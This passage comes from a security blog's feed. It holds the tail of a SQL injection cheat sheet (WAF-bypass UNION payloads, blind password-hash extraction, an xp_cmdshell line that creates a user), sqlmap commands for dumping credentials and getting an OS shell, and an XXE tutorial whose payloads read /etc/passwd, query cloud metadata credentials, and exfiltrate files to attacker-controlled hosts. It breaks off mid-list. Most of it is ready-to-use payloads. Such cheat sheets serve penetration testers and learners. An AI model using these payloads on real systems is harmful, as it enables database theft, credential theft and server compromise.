</span><span style="color:#75715e"></span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#75715e">/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/</span><span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>
id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#75715e">/**/</span><span style="color:#66d9ef">union</span><span style="color:#75715e">/*&amp;id=*/</span><span style="color:#66d9ef">select</span><span style="color:#75715e">/*&amp;id=*/</span><span style="color:#66d9ef">column</span><span style="color:#75715e">/*&amp;id=*/</span><span style="color:#66d9ef">from</span><span style="color:#75715e">/*&amp;id=*/</span><span style="color:#66d9ef">table</span><span style="color:#75715e">--
</span><span style="color:#75715e"></span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#75715e">/**/</span><span style="color:#66d9ef">union</span><span style="color:#75715e">/*&amp;id=*/</span><span style="color:#66d9ef">select</span><span style="color:#75715e">/*&amp;id=*/</span><span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span><span style="color:#75715e">--
</span><span style="color:#75715e"></span>id<span style="color:#f92672">=-</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> (<span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">=</span>(<span style="color:#66d9ef">Select</span> <span style="color:#ae81ff">0</span>xAA<span style="color:#f92672">*</span><span style="color:#ae81ff">1000</span>) <span style="color:#75715e">/*!UNION*/</span> <span style="color:#75715e">/*!SELECT*//**/</span><span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">â€”</span>x
 
<span style="color:#75715e">/**/</span><span style="color:#66d9ef">union</span><span style="color:#75715e">/*&amp;id=*/</span><span style="color:#66d9ef">select</span><span style="color:#75715e">/*&amp;id=*/</span><span style="color:#66d9ef">column</span><span style="color:#75715e">/*&amp;id=*/</span><span style="color:#66d9ef">from</span><span style="color:#75715e">/*&amp;id=*/</span><span style="color:#66d9ef">table</span><span style="color:#75715e">--
</span><span style="color:#75715e"></span><span style="color:#75715e">/*!union*/</span><span style="color:#f92672">+</span><span style="color:#75715e">/*!select*/</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">â€”</span>
<span style="color:#75715e">/*!UnIOn*//*!SeLect*/</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">â€”</span>
un<span style="color:#75715e">/**/</span>ion<span style="color:#f92672">+</span>sel<span style="color:#75715e">/**/</span>ect<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">â€”</span>
<span style="color:#75715e">/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/</span><span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">â€”</span>
ID<span style="color:#f92672">=</span><span style="color:#ae81ff">66</span><span style="color:#f92672">+</span><span style="color:#66d9ef">UnIoN</span><span style="color:#f92672">+</span><span style="color:#66d9ef">aLL</span><span style="color:#f92672">+</span><span style="color:#66d9ef">SeLeCt</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">7</span>,(<span style="color:#66d9ef">SELECT</span><span style="color:#f92672">+</span>concat(<span style="color:#ae81ff">0</span>x3a,id,<span style="color:#ae81ff">0</span>x3a,password,<span style="color:#ae81ff">0</span>x3a)<span style="color:#f92672">+</span><span style="color:#66d9ef">FROM</span><span style="color:#f92672">+</span>information_schema.columns<span style="color:#f92672">+</span><span style="color:#66d9ef">WHERE</span><span style="color:#f92672">+</span>table_schema<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>x6334706F645F666573746976616C5F636D73<span style="color:#f92672">+</span><span style="color:#66d9ef">AND</span><span style="color:#f92672">+</span><span style="color:#66d9ef">table_name</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>x7573657273),<span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">16</span>,<span style="color:#ae81ff">17</span>,<span style="color:#ae81ff">18</span>,<span style="color:#ae81ff">19</span>,<span style="color:#ae81ff">20</span>,<span style="color:#ae81ff">21</span>,<span style="color:#ae81ff">22</span>,<span style="color:#ae81ff">23</span>,<span style="color:#ae81ff">24</span>,<span style="color:#ae81ff">25</span>,<span style="color:#ae81ff">26</span>,<span style="color:#ae81ff">27</span>,<span style="color:#ae81ff">28</span>,<span style="color:#ae81ff">29</span>,<span style="color:#ae81ff">30</span><span style="color:#75715e">--
</span><span style="color:#75715e"></span> 
<span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#66d9ef">and</span><span style="color:#f92672">+</span>ascii(<span style="color:#66d9ef">lower</span>(mid((<span style="color:#66d9ef">select</span><span style="color:#f92672">+</span>pwd<span style="color:#f92672">+</span><span style="color:#66d9ef">from</span><span style="color:#f92672">+</span>users<span style="color:#f92672">+</span><span style="color:#66d9ef">limit</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>)))<span style="color:#f92672">=</span><span style="color:#ae81ff">74</span>
<span style="color:#66d9ef">index</span>.php<span style="color:#f92672">?</span>uid<span style="color:#f92672">=</span>strcmp(<span style="color:#66d9ef">left</span>((<span style="color:#66d9ef">select</span><span style="color:#f92672">+</span>hash<span style="color:#f92672">+</span><span style="color:#66d9ef">from</span><span style="color:#f92672">+</span>users<span style="color:#f92672">+</span><span style="color:#66d9ef">limit</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>),<span style="color:#ae81ff">1</span>),<span style="color:#ae81ff">0</span>x42)<span style="color:#f92672">+</span><span style="color:#ae81ff">123</span>
<span style="color:#f92672">?</span>page_id<span style="color:#f92672">=</span><span style="color:#66d9ef">null</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>A<span style="color:#75715e">/**//*!50000%55nIOn*//*yoyu*/</span><span style="color:#66d9ef">all</span><span style="color:#75715e">/**/</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>A<span style="color:#75715e">/*!%53eLEct*/</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>A<span style="color:#75715e">/*nnaa*/</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,
<span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">15</span><span style="color:#f92672">+</span><span style="color:#75715e">/*!UnIoN*/</span><span style="color:#f92672">+</span><span style="color:#75715e">/*!aLl*/</span><span style="color:#f92672">+</span><span style="color:#75715e">/*!SeLeCt*/</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>,<span style="color:#66d9ef">version</span>(),<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">7</span><span style="color:#75715e">--
</span><span style="color:#75715e"></span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#75715e">/*!limit+0+union+select+concat_ws(0Ã—3a,table_name,column_name)+from+information_schema.columns*/</span>
 
id<span style="color:#f92672">=-</span><span style="color:#ae81ff">725</span><span style="color:#f92672">+</span><span style="color:#75715e">/*!UNION*/</span><span style="color:#f92672">+</span><span style="color:#75715e">/*!SELECT*/</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>,GrOUp_COnCaT(<span style="color:#66d9ef">TABLE_NAME</span>),<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span><span style="color:#f92672">+</span><span style="color:#66d9ef">FROM</span><span style="color:#f92672">+</span><span style="color:#75715e">/*!INFORMATION_SCHEM*/</span>.TABLES<span style="color:#75715e">-- 
</span><span style="color:#75715e"></span>id<span style="color:#f92672">=-</span><span style="color:#ae81ff">725</span><span style="color:#f92672">+</span><span style="color:#75715e">/*!UNION*/</span><span style="color:#f92672">+</span><span style="color:#75715e">/*!SELECT*/</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>,GrOUp_COnCaT(<span style="color:#66d9ef">COLUMN_NAME</span>),<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span><span style="color:#f92672">+</span><span style="color:#66d9ef">FROM</span><span style="color:#f92672">+</span><span style="color:#75715e">/*!INFORMATION_SCHEM*/</span>.COLUMNS<span style="color:#f92672">+</span><span style="color:#66d9ef">WHERE</span><span style="color:#f92672">+</span><span style="color:#66d9ef">TABLE_NAME</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>x41646d696e<span style="color:#75715e">--
</span><span style="color:#75715e"></span> 
<span style="color:#66d9ef">SELECT</span><span style="color:#f92672">*</span><span style="color:#66d9ef">FROM</span>(test)<span style="color:#66d9ef">WHERE</span>(name)<span style="color:#66d9ef">IN</span>(_ucs2 <span style="color:#ae81ff">0</span>x01df010e004d00cf0148);
<span style="color:#66d9ef">SELECT</span>(extractvalue(<span style="color:#ae81ff">0</span>x3C613E61646D696E3C2F613E,<span style="color:#ae81ff">0</span>x2f61)) <span style="color:#66d9ef">in</span> xml way
 
<span style="color:#66d9ef">select</span> <span style="color:#66d9ef">user</span> <span style="color:#66d9ef">from</span> mysql.<span style="color:#66d9ef">user</span> <span style="color:#66d9ef">where</span> <span style="color:#66d9ef">user</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;user&#39;</span> <span style="color:#66d9ef">OR</span> mid(password,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>)<span style="color:#f92672">=</span>unhex(<span style="color:#e6db74">&#39;2a&#39;</span>)
<span style="color:#66d9ef">select</span> <span style="color:#66d9ef">user</span> <span style="color:#66d9ef">from</span> mysql.<span style="color:#66d9ef">user</span> <span style="color:#66d9ef">where</span> <span style="color:#66d9ef">user</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;user&#39;</span> <span style="color:#66d9ef">OR</span> mid(password,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>) regexp <span style="color:#e6db74">&#39;[*]&#39;</span>
<span style="color:#66d9ef">select</span> <span style="color:#66d9ef">user</span> <span style="color:#66d9ef">from</span> mysql.<span style="color:#66d9ef">user</span> <span style="color:#66d9ef">where</span> <span style="color:#66d9ef">user</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;user&#39;</span> <span style="color:#66d9ef">OR</span> mid(password,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>) <span style="color:#66d9ef">like</span> <span style="color:#e6db74">&#39;*&#39;</span>
<span style="color:#66d9ef">select</span> <span style="color:#66d9ef">user</span> <span style="color:#66d9ef">from</span> mysql.<span style="color:#66d9ef">user</span> <span style="color:#66d9ef">where</span> <span style="color:#66d9ef">user</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;user&#39;</span> <span style="color:#66d9ef">OR</span> mid(password,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>) rlike <span style="color:#e6db74">&#39;[*]&#39;</span>
<span style="color:#66d9ef">select</span> <span style="color:#66d9ef">user</span> <span style="color:#66d9ef">from</span> mysql.<span style="color:#66d9ef">user</span> <span style="color:#66d9ef">where</span> <span style="color:#66d9ef">user</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;user&#39;</span> <span style="color:#66d9ef">OR</span> ord(mid(password,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>))<span style="color:#f92672">=</span><span style="color:#ae81ff">42</span>
 
<span style="color:#f92672">/?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#66d9ef">union</span><span style="color:#f92672">+</span>(<span style="color:#66d9ef">select</span><span style="color:#e6db74">&#39;1&#39;</span>,concat(login,hash)<span style="color:#66d9ef">from</span><span style="color:#f92672">+</span>users)
<span style="color:#f92672">/?</span>id<span style="color:#f92672">=</span>(<span style="color:#ae81ff">1</span>)<span style="color:#66d9ef">union</span>(((((((<span style="color:#66d9ef">select</span>(<span style="color:#ae81ff">1</span>),hex(hash)<span style="color:#66d9ef">from</span>(users))))))))
 
<span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;; /*&amp;id=1*/ EXEC /*&amp;id=1*/ master..xp_cmdshell /*&amp;id=1*/ net user lucifer UrWaFisShiT /*&amp;id=1*/ --
</span><span style="color:#e6db74">id=10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)
</span><span style="color:#e6db74">id=10 and 1=0/(select top 1 table_name from information_schema.tables)
</span><span style="color:#e6db74">id=-725+UNION+SELECT+1,GROUP_CONCAT(id,0x3a,login,0x3a,password,0x3a,email,0x3a,access_level),3,4,5+FROM+Admin--
</span><span style="color:#e6db74">id = -725 + UNION + SELECT + 1, version (), 3,4,5 - sp_password // use request of log hidden sp_password
</span></code></pre></div><h1 id="sqlmap">SQLMAP</h1>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://testsite.com/login.php&#34;</span> 
<span style="color:#f92672">[</span>eazy scan<span style="color:#f92672">]</span>
sqlmap -r request.txt 
<span style="color:#f92672">[</span>eazy scan with request file<span style="color:#f92672">]</span>
sqlmap -u <span style="color:#e6db74">&#34;http://testsite.com/login.php&#34;</span> --tor --tor-type<span style="color:#f92672">=</span>SOCKS5 
<span style="color:#f92672">[</span>using tor<span style="color:#f92672">]</span>
sqlmap -u <span style="color:#e6db74">&#34;http://testsite.com/login.php&#34;</span> --dbs 
<span style="color:#f92672">[</span>list all database<span style="color:#f92672">]</span>
sqlmap -u <span style="color:#e6db74">&#34;http://testsite.com/login.php&#34;</span> -D site_db --tables
<span style="color:#f92672">[</span>list table in db site_db<span style="color:#f92672">]</span>
sqlmap -u <span style="color:#e6db74">&#34;http://testsite.com/login.php&#34;</span> -D site_db -T users --columns
<span style="color:#f92672">[</span>list collums<span style="color:#f92672">]</span>
sqlmap -u <span style="color:#e6db74">&#34;http://testsite.com/login.php&#34;</span> -D site_db -T users -C username,password --dump
<span style="color:#f92672">[</span>Dump only selected columns<span style="color:#f92672">]</span>
sqlmap -u <span style="color:#e6db74">&#34;http://testsite.com/login.php&#34;</span> â€“method <span style="color:#e6db74">&#34;POST&#34;</span> â€“data <span style="color:#e6db74">&#34;username=admin&amp;password=admin&amp;submit=Submit&#34;</span> -D social_mccodes -T users â€“dump
<span style="color:#f92672">[</span>Dump a table from a database when you have admin credentials<span style="color:#f92672">]</span>
sqlmap --dbms<span style="color:#f92672">=</span>mysql -u <span style="color:#e6db74">&#34;http://testsite.com/login.php&#34;</span> --os-shell
<span style="color:#f92672">[</span>Get OS Shel<span style="color:#f92672">]</span>
sqlmap --dbms<span style="color:#f92672">=</span>mysql -u <span style="color:#e6db74">&#34;http://testsite.com/login.php&#34;</span> --sql-shell
<span style="color:#f92672">[</span>Get SQL Shell<span style="color:#f92672">]</span>
sqlmap -r login-chris.request --level <span style="color:#ae81ff">5</span> --risk <span style="color:#ae81ff">3</span> --batch --string <span style="color:#e6db74">&#34;Wrong identification(query corect)&#34;</span>
<span style="color:#f92672">[</span>best<span style="color:#f92672">]</span>
</code></pre></div><h1 id="reference">Reference</h1>
<p>-<a href="https://sqlwiki.netspi.com/#mysql">https://sqlwiki.netspi.com/#mysql</a><br>
-<a href="https://sites.google.com/a/michaelboman.org/www-michaelboman-org/books/sql-injection-cheat-sheet-oracle">https://sites.google.com/a/michaelboman.org/www-michaelboman-org/books/sql-injection-cheat-sheet-oracle</a><br>
-<a href="https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/">https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/</a><br>
-<a href="https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/">https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/</a></p>
]]></content>
        </item>
        
        <item>
            <title>XXE</title>
            <link>https://tranquac.github.io/posts/2021/06/xxe/</link>
            <pubDate>Mon, 07 Jun 2021 00:00:00 +0000</pubDate>
            
            <guid>https://tranquac.github.io/posts/2021/06/xxe/</guid>
            <description>What is XXE Types of XXE attacks  XXE To retrieve files  Example XXE through the XInclude tag Exploiting XXE using SVG Files or docx files or xlsx files   XXE Into SSRF Blind XXE   Payloads Note References  What is XXE XXE = XML eXternal Entities
XXE can occur when XML documents get parsed. We traditionally think of XXE vulnerabilities as uploading an XML file that includes an external entity, an example of this would be:</description>
            <content type="html"><![CDATA[<ul>
<li><a href="#what-is-xxe">What is XXE</a></li>
<li><a href="#types-of-xxe-attacks">Types of XXE attacks</a>
<ul>
<li><a href="#xxe-to-retrieve-files">XXE To retrieve files</a>
<ul>
<li><a href="#example">Example</a></li>
<li><a href="#xxe-through-the-xinclude-tag">XXE through the XInclude tag</a></li>
<li><a href="#exploiting-xxe-using-svg-files-or-docx-files-or-xlsx-files">Exploiting XXE using SVG Files or docx files or xlsx files</a></li>
</ul>
</li>
<li><a href="#xxe-into-ssrf">XXE Into SSRF</a></li>
<li><a href="#blind-xxe">Blind XXE</a></li>
</ul>
</li>
<li><a href="#payloads">Payloads</a></li>
<li><a href="#note">Note</a></li>
<li><a href="#references">References</a></li>
</ul>
<h2 id="what-is-xxe">What is XXE</h2>
<p>XXE = XML eXternal Entities</p>
<p>XXE can occur when XML documents get parsed. We traditionally think of XXE vulnerabilities as uploading an XML file that includes an external entity, an example of this would be:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
<span style="color:#75715e">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;</span>]&gt;
<span style="color:#f92672">&lt;foo&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/foo&gt;</span>
</code></pre></div><p>We might be able to upload this file if we save it as .xml into an application that process XML files but what some people don&rsquo;t know is that some other file types consist of XML files.</p>
<h2 id="types-of-xxe-attacks">Types of XXE attacks</h2>
<p>XXE can be abused to perform several types of attacks. It can even be chained into things like SSRF.</p>
<ul>
<li>XXE to retrieve files</li>
<li>XXE to perform SSRF</li>
<li>Blind XXE</li>
</ul>
<h3 id="xxe-to-retrieve-files">XXE To retrieve files</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span> ]&gt;
<span style="color:#f92672">&lt;product&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/product&gt;</span>
<span style="color:#f92672">&lt;adress&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/adress&gt;</span>
</code></pre></div><p>In this example we first define the document type and in there we define a new Entity called &ldquo;XXE&rdquo;. This entity is made to execute a system call. This can be anything like ls, a reverse shell or in this case a file inclusion. It will grab the /etc/passwd file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span> ]&gt;
</code></pre></div><p>Next we will display that entity xxe into every possible field of our XML file. It&rsquo;s very important to insert your XXE entity into every single XML element. Any of them can be vulnerable as the developer has to filter ALL the fields indivually.\</p>
<h4 id="example">Example</h4>
<p>Request
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/retrieve_file_1.PNG" alt="retrieve_file_1.PNG">
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/retrieve_file_2.PNG" alt="retrieve_file_2.PNG">
From here, we can modify the XML data to add in an XXE to request the file we wish to target.
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/retrieve_file_3.PNG" alt="retrieve_file_3.PNG">
Response
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/retrieve_file_4.PNG" alt="retrieve_file_4.PNG"></p>
<h4 id="xxe-through-the-xinclude-tag">XXE through the XInclude tag</h4>
<p>Often, an attacker does not have full control over the XML data, but has control over an input passed into the data. In these cases, they canâ€™t inject an entity before the XML parameters, which makes it appear impossible to conduct XXE attacks. Often however, it is possible to do a XXE attack with just access to a single parameter, using the XInclude feature of XML.<br>
XInclude can be thought of as a way of including another XML document within an existing one. Using this feature, we can include a XML component that defines our external entity, and use that to leak data from the server. In this situation, the data sent from the client includes only the parameters required to add to the XML.
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/xinclude1.PNG" alt="xinclude1.PNG">
To setup the XInclude, we need to inject data into the product ID parameter. The payload will look like below.
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/xinclude2.PNG" alt="xinclude2.PNG">
Without all of the encoding, the payload is:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;foo</span> <span style="color:#a6e22e">xmlns:xi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XInclude&#34;</span><span style="color:#f92672">&gt;&lt;xi:include</span> <span style="color:#a6e22e">parse=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">href=</span><span style="color:#e6db74">&#34;file:///etc/passwd&#34;</span><span style="color:#f92672">/&gt;&lt;/foo&gt;</span>
</code></pre></div><h4 id="exploiting-xxe-using-svg-files-or-docx-files-or-xlsx-files">Exploiting XXE using SVG Files or docx files or xlsx files</h4>
<p>Gen docx file with python
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/docx1.PNG" alt="docx1.PNG">
A Docx file is mostly just zipped up xml files. We need to unzip the resume.docx file and modify the contents in â€œword/document.xmlâ€. Then, save our changes back to resume.docx.
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/docx2.PNG" alt="docx2.PNG">
Two modifications are needed in document.xml.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE test [&lt;!ENTITY test SYSTEM &#39;file:///etc/passwd&#39;&gt;</span>]&gt;
</code></pre></div><p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/docx4.PNG" alt="docx4.PNG">
You can do the same with xlsx and svg
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/svg.PNG" alt="svg.PNG"></p>
<h3 id="xxe-into-ssrf">XXE Into SSRF</h3>
<p>A SSRF attack allows an attacker to perform server-side request forgery. This basically means that the attacker can make HTTP requests to any URL the server can access. This means that they can access URLs that they typically donâ€™t have permission to access, which could potentially leak data.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM
</span><span style="color:#75715e">&#34;http://intranet.cheeseshop.com&#34;&gt;</span> ]&gt;
</code></pre></div><h3 id="blind-xxe">Blind XXE</h3>
<p>The majority of XXE vulnerabilities in the wild will be blind XXE attacks. To detect these we can use an out of band webserver that we host ourselves and make the target do a callback to our server using the same technique we used previously in XXE into SSRF.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;http://f2g9j7hhkax.web-attacker.com&#34;&gt;</span>
]&gt;
</code></pre></div><p>If we detect blind XXE, we can exfiltrate data via OAST</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
<span style="color:#75715e">&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http://webattacker.com/?x=%file;&#39;&gt;</span>&#34;&gt;
%eval;
%exfiltrate;
</code></pre></div><p>Our first entity will grab the data file /etc/passwd and our second entity will make a callback to our server with the contents of the /etc/passwd file in a get parameter.</p>
<h2 id="cheetsheat">Cheetsheat</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"> --------------------------------------------------------------------
using external entities:
<span style="color:#75715e">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span> ]&gt;
--------------------------------------------------------------------
perform SSRF attacks:
<span style="color:#75715e">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&#34;&gt;</span> ]&gt;
--------------------------------------------------------------------
Blind XXE with out-of-band interaction:
<span style="color:#75715e">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;http://burp-collab&#34;&gt;</span> ]&gt;
--------------------------------------------------------------------
Blind XXE with out-of-band interaction via XML parameter entities:
<span style="color:#75715e">&lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM &#34;http://burp-collaborator&gt;</span> %xxe; ]&gt;
--------------------------------------------------------------------
blind XXE to exfiltrate data using a malicious external DTD:
DTD file:
<span style="color:#75715e">&lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
<span style="color:#75715e">&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; test SYSTEM &#39;http://burp-collaborator/?a=%file;&#39;&gt;</span>&#34;&gt;
%eval;
%test;
XXE Payload:
<span style="color:#75715e">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &#34;YOUR-DTD-URL&#34;&gt;</span> %xxe;]&gt;
-------------------------------------------------------------------
blind XXE to retrieve data via error messages:
DTD file:
<span style="color:#75715e">&lt;!ENTITY % passwd SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
<span style="color:#75715e">&lt;!ENTITY % notvalid &#34;&lt;!ENTITY &amp;#x25; test SYSTEM &#39;file:///invalid/%file;&#39;&gt;</span>&#34;&gt;
%notvalid;
%test;
XXE Payload:
<span style="color:#75715e">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &#34;YOUR-DTD-URL&#34;&gt;</span> %xxe;]&gt;
-------------------------------------------------------------------
XInclude to retrieve files:
<span style="color:#f92672">&lt;foo</span> <span style="color:#a6e22e">xmlns:xi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XInclude&#34;</span><span style="color:#f92672">&gt;&lt;xi:include</span> <span style="color:#a6e22e">parse=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">href=</span><span style="color:#e6db74">&#34;file:///etc/passwd&#34;</span><span style="color:#f92672">/&gt;&lt;/foo&gt;</span>
-------------------------------------------------------------------
XXE via image file upload:
